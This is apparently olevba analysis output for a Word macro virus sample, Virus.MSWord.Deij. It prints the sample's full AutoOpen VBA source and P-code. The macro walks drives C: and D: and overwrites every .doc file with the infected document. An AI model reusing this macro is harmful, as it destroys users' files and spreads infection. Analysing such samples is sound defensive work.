olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deij
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deij - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Deij - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'.---------.
': WM.jDiE :
'`---------'

Public Sub MAIN()
Dim d
On Error GoTo -1: On Error GoTo EndMain
For d = Asc("C") To Asc("D")
        Troi Chr(d), Chr(d) + ":\"
Next d
EndMain:
End Sub

Private Sub Troi(d$, path$)
Dim DirNum
Dim i
Dim CurDir_$
Dim f$
Dim c
DirNum = WordBasic.CountDirectories(path$)
If DirNum = -1 Then GoTo FindFile
For i = 1 To DirNum
        CurDir_$ = WordBasic.[GetDirectory$](path$, i)
        Troi d$, path$ + CurDir_$ + "\"
Next i
FindFile:
f$ = WordBasic.[Files$](path$ + "*.doc")
c = -1
While f$ <> ""
        c = c + 1
        f$ = WordBasic.[Files$]()
Wend
If c > -1 Then
        f$ = WordBasic.[Files$](path$ + "*.doc")
        WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
        For i = 1 To count_
                f$ = WordBasic.[Files$]()
                WordBasic.CopyFile FileName:=WordBasic.[FileName$](), Directory:=f$
        Next i
End If
WordBasic.ToolsOptionsUserInfo Name:="jDiE"
WordBasic.PrintStatusBar "jDiE here!"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Deij
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2840 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x000B ".---------."
' Line #2:
' 	QuoteRem 0x0000 0x000B ": WM.jDiE :"
' Line #3:
' 	QuoteRem 0x0000 0x000B "`---------'"
' Line #4:
' Line #5:
' 	FuncDefn (Public Sub MAIN())
' Line #6:
' 	Dim 
' 	VarDefn d
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError EndMain 
' Line #8:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	LitStr 0x0001 "C"
' 	ArgsLd Asc 0x0001 
' 	LitStr 0x0001 "D"
' 	ArgsLd Asc 0x0001 
' 	For 
' Line #9:
' 	Ld d 
' 	ArgsLd Chr 0x0001 
' 	Ld d 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 ":\"
' 	Add 
' 	ArgsCall Troi 0x0002 
' Line #10:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Label EndMain 
' Line #12:
' 	EndSub 
' Line #13:
' Line #14:
' 	FuncDefn (Private Sub Troi(d, path))
' Line #15:
' 	Dim 
' 	VarDefn DirNum
' Line #16:
' 	Dim 
' 	VarDefn i
' Line #17:
' 	Dim 
' 	VarDefn CurDir_
' Line #18:
' 	Dim 
' 	VarDefn False
' Line #19:
' 	Dim 
' 	VarDefn c
' Line #20:
' 	Ld path$ 
' 	Ld WordBasic 
' 	ArgsMemLd CountDirectories 0x0001 
' 	St DirNum 
' Line #21:
' 	Ld DirNum 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo FindFile 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DirNum 
' 	For 
' Line #23:
' 	Ld path$ 
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [GetDirectory$] 0x0002 
' 	St CurDir_$ 
' Line #24:
' 	Ld d$ 
' 	Ld path$ 
' 	Ld CurDir_$ 
' 	Add 
' 	LitStr 0x0001 "\"
' 	Add 
' 	ArgsCall Troi 0x0002 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	Label FindFile 
' Line #27:
' 	Ld path$ 
' 	LitStr 0x0005 "*.doc"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St False$ 
' Line #28:
' 	LitDI2 0x0001 
' 	UMi 
' 	St c 
' Line #29:
' 	Ld False$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	While 
' Line #30:
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0000 
' 	St False$ 
' Line #32:
' 	Wend 
' Line #33:
' 	Ld c 
' 	LitDI2 0x0001 
' 	UMi 
' 	Gt 
' 	IfBlock 
' Line #34:
' 	Ld path$ 
' 	LitStr 0x0005 "*.doc"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St False$ 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed FileName 
' 	Ld False$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld count_ 
' 	For 
' Line #37:
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0000 
' 	St False$ 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	ParamNamed FileName 
' 	Ld False$ 
' 	ParamNamed Directory 
' 	Ld WordBasic 
' 	ArgsMemCall CopyFile 0x0002 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitStr 0x0004 "jDiE"
' 	ParamNamed New 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsUserInfo 0x0001 
' Line #42:
' 	LitStr 0x000A "jDiE here!"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #43:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

